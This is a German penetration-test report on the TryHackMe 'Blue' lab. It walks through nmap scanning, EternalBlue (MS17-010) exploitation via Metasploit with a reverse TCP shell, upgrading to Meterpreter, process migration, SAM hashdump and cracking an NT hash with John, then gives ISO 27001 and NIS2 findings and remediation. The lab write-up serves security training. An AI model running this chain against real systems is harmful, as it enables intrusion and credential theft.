# Penetration-Test "Blue" - TryHackMe

## 1. Management Zusammenfassung

Dieser Test wurde in einer virtuellen Umgebung als Übung durchgeführt, um nach NIS2 Artikel 21 zu überprüfen, ob die implementierten Sicherheitskontrollen (Security Controls) des Testsystems wirksam sind.

Im getesteten System wurden kritische Sicherheitsrisiken in Bezug auf veraltete Server Message Block (SMB)- und Remote Desktop Dienste identifiziert. Diese Schwachstellen (Vulnerabilities) ermöglichen es einem Angreifer, die vollständige Kontrolle unter dem Kontext NT AUTHORITY\SYSTEM zu erlangen. Dies ermöglicht uneingeschränkten Zugriff auf das gesamte System, einschließlich aller Dateien, Prozesse und Kernfunktionen des lokalen Betriebssystems.

In einem realen Netzwerk hätte diese Schwachstelle aufgrund des Risikos der Datenexfiltration sowie der daraus resultierenden rechtlichen Konsequenzen erhebliche negative Auswirkungen auf den Geschäftsbetrieb. Gemäß NIS2 Artikel 23 und dem BSI würde ein Exploit dieser Schwachstelle als "erheblich" eingestuft werden und müsste innerhalb von 24 Stunden an das CERT-Bund des BSI gemeldet werden. Zusätzlich würde [§ 2 Nr. 11 BSIG](https://www.gesetze-im-internet.de/bsig_2025/__2.html) greifen. Würde das Ausnutzen einer solchen Sicherheitslücke in einem realen Szenario Geschäftssysteme kompromittieren, würden bei Nichtmeldung andernfalls hohe Geldstrafen nach NIS2 Artikel 34 Absätze 4 und 5 drohen.

## 2. Scope und Umgebung

Der Test wurde auf der TryHackMe-Plattform durchgeführt.

  - Attacking System (Angreifersystem): 10.112.107.24 (Ubuntu mit vorinstallierten Kali-Tools)
  - Target System (Zielsystem): 10.112.140.209 (Windows x64)

Ziele:

  - Durchführung von Reconnaissance
  - Initial Access erlangen, Privilege Escalation durchführen
  - Auffinden und Extrahieren von Dateien
  - Cracking von gehashten Secrets innerhalb dieser Dateien
    
## 3. Methodology

Der Test wurde in einer Blackbox Umgebung durchgeführt, in der ausschließlich die IP-Adresse des Zielsystems bekannt war.
Der Test orientiert sich im Rahmen der Möglichkeiten einer virtuellen Umgebung an den Vorgaben des Penetration Testing Execution Standard (PTES).

### 3.1 Reconnaissance
  - Nutzung von ICMP zur Bestätigung der Erreichbarkeit des Zielsystems.
  - Einsatz von Nmap für das Scannen nach offenen Ports und Vulnerabilities.
### 3.2 Vulnerability Analysis
  - Identifizierung ungepatchter Windows-Schwachstellen in Form von MS17-010 und MS12-020.
### 3.3 Exploitation
  - Nutzung des Metasploit Frameworks, um Initial Access zum Zielsystem zu erlangen.
  - Ausnutzung (Exploitation) von MS17-010 für Remote Code Execution.
### 3.4 Post-Exploitation
  - Privilege Escalation von einer Windows Shell zu einer Meterpreter Shell und Migration in den spoolsv.exe Prozess.
  - Extraktion von Passwort-Hashes (Credential Dumping) und Offline-Cracking.
### 3.5 Attack Chain nach MITRE ATT&CK
  - Active Scanning nach Vulnerabilities [T1595.002](https://attack.mitre.org/techniques/T1595/002/)
  - Initial Access durch Exploitation von Remote Services [T1210](https://attack.mitre.org/techniques/T1210/)
  - Privilege Escalation [T1068](https://attack.mitre.org/techniques/T1068/)
  - Defense Evasion durch Process Injection [T1055](https://attack.mitre.org/techniques/T1055/)
  - Credential Access durch Security Account Manager (SAM) Credential Dumping [T1003.002](https://attack.mitre.org/techniques/T1003/002/)
  - Credential Access durch Brute Force Password Cracking [T1110.002](https://attack.mitre.org/techniques/T1110/002/)
  - Discovery von Dateien und Verzeichnissen (THM Flags) [T1083](https://attack.mitre.org/techniques/T1083/)

## 4. Timeline

Das Engagement begann mit einem Ping-Befehl, um sicherzustellen, dass das Zielsystem online ist.

```
>_ ping 10.112.140.209
< 64 bytes from 10.112.140.209: icmp_seq=1 ttl=128 time=0.850 ms
```

Das Zielsystem wurde unter der angegebenen IP-Adresse gefunden und als aktiv bestätigt.
Als Nächstes wurde ein Portscan mit einem Vulnerabilityskript durchgeführt, um nicht nur nach offenen Ports zu suchen, sondern diese Ports auch auf bekannte und ausnutzbare Vulnerabilities abzugleichen.

```
>_ nmap -sV --script vuln 10.112.140.209
```

Der durchgeführte Scan entdeckte die offenen Ports 135, 139, 445, 3389, 49152-54, 49160 und 49165. Im Rahmen dieses Scans wurden kritische Schwachstellen in Bezug auf Port 445 und 3389 erkannt.

![ms12-020](https://github.com/V4641/InfoSec-Portfolio/blob/main/Offensive/Penetration-Test-Report/Screenshots/Pentest/000_Portscan_Vuln_1.png)

Für Port 3389 (Remote Desktop) wurde Schwachstelle MS12-020, auch bekannt als CVE-2012-0002, mit einem Risiko von 4.3 für DoS-Angriffe und 9.3 für Remote Code Execution-Angriffe gemäß CVSS-Bewertung (Scoring) entdeckt.

![ms17-010](https://github.com/V4641/InfoSec-Portfolio/blob/main/Offensive/Penetration-Test-Report/Screenshots/Pentest/001%20Portscan_Vuln_2.png)

Für Port 445 (Server Message Block) wurde die Schwachstelle MS17-010, auch bekannt als CVE-2017-0143 - 0148, mit einem kritischen Risiko für Remote Code Execution von 9.3 gemäß CVSS v2.0-Scoring erkannt.

MS17-010 wurde als Angriffsvektor für das Metasploit-Framework gewählt, welches 29 Module für MS17-010 und 2 Module für MS12-020 bereitstellte.

```
>_ msfconsole
msf6>_ search ms17-010
< exploit/windows/smb/ms17_010_eternalblue
```

![Metasploit](https://github.com/V4641/InfoSec-Portfolio/blob/main/Offensive/Penetration-Test-Report/Screenshots/Pentest/003%20Metasploit.png)

```
msf6>_ use 0
<msf6 exploit(windows/smb/ms17_010_eternalblue
msf6>_ show options
msf6>_ set RHOSTS 10.112.140.209
msf6>_ show payloads ms17-010
msf6>_ set payload 56
>_ run
```

Modul 0 (EternalBlue) wurde ausgewählt, das Ziel als 10.112.140.209 definiert und Payload 56 (windows/x64/shell/reverse_tcp) konfiguriert.

Ein vorheriger Versuch mit Payload 31, um von Beginn an mit einer Meterpreter Shell zu starten, schlug fehl. Dies erforderte zunächst eine Windows Shell mit anschließendem Pivot zu Meterpreter.

![Run_Exploit](https://github.com/V4641/InfoSec-Portfolio/blob/main/Offensive/Penetration-Test-Report/Screenshots/Pentest/004%20Run_Exploit.png)

Eine aktive Session mit dem Zielsystem wurde etabliert. Das Engagement wurde mit der Etablierung einer Meterpreter Shell vom Attacking System aus fortgesetzt, um Zugriff auf Meterpreter Befehle zu erhalten.

```
msf6>_ use post/multi/manage/shell_to_meterpreter
msf6>_ show options
msf6>_ set SESSION 1
msf6>_ run
msf6>_ sessions
msf6>_ sessions -i 2
< username: NT AUTHORITY\SYSTEM
```

Eine zweite Session, dieses Mal mit einer Meterpreter Shell, wurde mit NT AUTHORITY\SYSTEM-Rechten erstellt, wie durch das Zielsystem bestätigt wurde.

Im nächsten Schritt wurde eine Migration von der derzeit instabilen Verbindung in einen stabileren Prozess durchgeführt, um Unterbrechungen während des Angriffs zu minimieren.


```
meterpreter>_ ps
meterpreter>_ migrate 1304
meterpreter>_ hashdump
```

![Migration-hashdump](https://github.com/V4641/InfoSec-Portfolio/blob/main/Offensive/Penetration-Test-Report/Screenshots/Pentest/005%20Meterpreter_hashdump.png)

Die Migration in den Prozess 1304, spoolsv.exe, wurde durchgeführt, um eine stabile Verbindung zu gewährleisten.

Im Anschluss an die Migration wurde ein Hashdump durchgeführt, der drei Passwort-Hashes aufdeckte, von denen nur einer kein Standardbenutzer (Default User) ist.

Der Hash des Benutzers 'Jon' (aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d) wurde auf dem Attacking System geknackt.

```
>_ john jon.txt --format=NT --wordlist=/usr/share/wordlists/rockyou.txt
```


Das Passwort für den Benutzer 'Jon' wurde mithilfe von rockyou.txt innerhalb einer Minute als 'a******2' identifiziert.

Daraufhin wurden weitere Flags innerhalb des Zielsystems auf dem Laufwerk C entdeckt, welche vertrauliche Dateien simulierten.

![flag1](https://github.com/V4641/InfoSec-Portfolio/blob/main/Offensive/Penetration-Test-Report/Screenshots/Pentest/007%20Lateral_Movement_Flag1.png)

![flag2-3](https://github.com/V4641/InfoSec-Portfolio/blob/main/Offensive/Penetration-Test-Report/Screenshots/Pentest/008%20Flag2_3.png)

## 5. Findings

### Finding 01:
  - Kritische Remote Code Execution unter MS17-010 (EternalBlue)
  - Severity: Critical (CVSS v2.0 Score: 9.3, CVSS v3.1: 8.8)
  - Betroffener Port: 445 (TCP - Server Message Block)

Beschreibung:
Das Zielsystem führt eine veraltete Version des Server Message Block (SMBv1)-Protokolls ohne die nötigen Sicherheitsupdates, um MS17-010 zu verhindern. Ein Angreifer kann Initial Access zum Zielsystem erlangen, Code ausführen, eine Privilege Escalation zu NT AUTHORITY\SYSTEM durchführen und die vollständige Kontrolle über das Zielsystem übernehmen.

ISO 27001 Control Mapping:
  - A.8.8 Management of Technical Vulnerabilities: Die Organisation hat es versäumt, Informationen über technische Schwachstellen einzuholen und kritische Patches auf das System anzuwenden.
  - A.8.20 Network Security: Die Organisation hat ein unsicheres und obsoletes Protokoll (SMBv1) im Netzwerk aktiv gelassen.

### Finding 02:
  - Kritische Remote Code Execution und DoS-Risiko unter MS12-020
  - Severity: Critical (CVSS v2.0 Score: 9.3 für RCE, 4.3 für DoS)
  - Betroffener Port: 3389 (TCP - Remote Desktop Protocol)

Beschreibung:
Das Zielsystem führt einen Dienst aus, der für MS12-020 anfällig ist. Ein Angreifer kann diese Vulnerability ausnutzen, um einen Denial of Service (DoS) zu verursachen oder Code remote auszuführen (RCE), wodurch sowohl die Verfügbarkeit als auch die Integrität des Target Systems kompromittiert werden.

ISO 27001 Control Mapping:
  - A.8.8 Management of Technical Vulnerabilities: Die Organisation hat es versäumt, bekannte Schwachstellen in Remote-Access-Diensten zu patchen.

## 6. Remediation-Empfehlungen

Um die Konformität mit ISO 27001 und NIS2 gemäß Abschnitt 1 zu gewährleisten, wird die zeitnahe Umsetzung der folgenden Maßnahmen empfohlen:

  - Patch Management: Aktualisierung des Systems, um die Exploitation seit langem bekannter Schwachstellen zu verhindern.
  - Empfehlung zur Nutzung von SMBv3 oder alternativen Lösungen anstelle des hochgradig unsicheren SMBv1.
  - Sicherstellung notwendiger Updates zur Härtung von Remote Desktop und potenzielle Einschränkung des Zugriffs auf Port 3389.
  - Durchsetzung einer strengeren Passwortrichtlinie, sowohl hinsichtlich Länge und Komplexität, als auch durch den Abgleich mit bekannten oder geleakten Passwörtern.
  - Falls eine Passwortrichtlinie nicht durchgesetzt werden kann, wird die Implementierung von MFA (Multi-Faktor-Authentifizierung) für den Systemzugriff empfohlen.
  - Konfiguration der Firewall, um eingehenden SMB- oder RDP-Traffic ausschließlich auf autorisiertes Personal zu beschränken.
  - Einsatz von IDS oder IPS zur Erkennung, Alarmierung und Prävention von Signaturen, die auf ungewöhnlichen SMBv1-Traffic hindeuten.
  - Sicherstellung, dass Network Level Authentication (NLA) für alle RDP-Verbindungen aktiviert ist.
